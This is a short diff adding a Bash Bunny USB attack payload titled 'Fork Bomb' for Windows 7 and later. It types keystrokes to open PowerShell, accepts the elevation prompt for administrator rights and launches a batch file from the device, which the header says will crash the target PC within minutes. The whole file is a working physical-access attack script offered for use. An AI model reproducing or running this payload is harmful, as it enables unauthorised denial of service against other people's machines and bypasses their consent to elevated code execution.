@@ -1,0 +1,26 @@
+#!/bin/bash
+#
+# Title:         Fork Bomb
+# Author:        JeffParkerModHD
+# Version:       1.0
+# Target:        Windows 7+
+#
+# What this script does is it will crash a pc in a matter of minutes depending on the proccessing power of so (the target machine)...
+
+GET SWITCH_POSITION
+LED R
+ATTACKMODE HID STORAGE
+Q DELAY 100
+Q GUI
+Q DELAY 100
+Q STRING powershell
+Q DELAY 100
+Q CTRL-SHIFT ENTER
+Q DELAY 300
+Q LEFTARROW
+Q DELAY 100
+Q ENTER
+Q DELAY 300
+Q STRING powershell ".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\$SWITCH_POSITION\basher.bat')"
+Q DELAY 100
+Q ENTER
